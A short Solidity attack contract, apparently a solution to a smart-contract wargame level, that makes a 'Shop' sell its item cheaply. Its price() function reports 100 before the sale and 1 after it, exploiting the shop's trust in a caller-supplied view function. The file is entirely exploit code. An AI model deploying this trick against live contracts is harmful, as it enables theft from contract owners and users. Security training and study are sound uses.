pragma solidity ^0.6.0;

import "./default.sol";

contract Attack {
    Shop shop;

    constructor(address _shop) public {
        shop = Shop(_shop);
    }

    function price() external view returns (uint256) {
        if (!shop.isSold()) {
            return 100;
        } else {
            return 1;
        }
    }

    function buy() public {
        shop.buy();
    }
}
